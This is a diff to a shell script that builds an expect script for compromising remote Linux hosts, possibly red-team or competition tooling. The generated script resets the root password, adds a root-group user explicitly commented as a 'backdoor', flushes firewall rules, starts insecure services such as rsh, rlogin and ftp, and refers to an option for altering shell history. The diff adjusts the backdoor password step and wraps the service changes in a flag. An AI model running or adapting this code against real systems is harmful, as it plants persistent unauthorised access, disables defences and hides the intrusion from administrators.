@@ -14,6 +14,7 @@ fi
 expectFile="connect.exp"
 serviceStop="iptables"
 serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs smb smbd samba rsync rsh rlogin ftp"
+doServices="yes"
 newUser="sysd"
 newRootPass="Password!"
 newPass="Password!"
@@ -86,22 +87,24 @@ send "echo -e \"$newRootPass\n$newRootPass\" | passwd\r" #change root password
 interact -o -nobuffer -re \$prompt return
 send "useradd -g root -G sudo -o -u 250 $newUser\r" #add 'backdoor' user
 interact -o -nobuffer -re \$prompt return
-send "echo -e \"$newRootPass\n$newRootPass\" | passwd\r" #add 'backdoor' user
+send "echo -e \"$newPass\n$newPass\" | passwd\r" #change backdoor user's password
 interact -o -nobuffer -re \$prompt return
-send "/usr/bin/env iptables -F || ipfw flush\r"
+send "/usr/bin/env iptables -F || ipfw flush\r" #flush firewall rules
 MORE
 
 #start certain services
-for service in $serviceStart; do
-	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
-	echo "send\"/usr/bin/env service $service start\r\" " >> $expectFile
-done
+if [ "$doServices" == "yes" ]; then
+	for service in $serviceStart; do
+		echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
+		echo "send\"/usr/bin/env service $service start\r\" " >> $expectFile
+	done
 
-#stop certain services
-for service in $serviceStop; do
-	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
-	echo "send\"/usr/bin/env service $service stop\r\" " >> $expectFile
-done
+	#stop certain services
+	for service in $serviceStop; do
+		echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
+		echo "send\"/usr/bin/env service $service stop\r\" " >> $expectFile
+	done
+fi
 
 if [ "$alterLastHistory" == "yes" ]; then
 	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
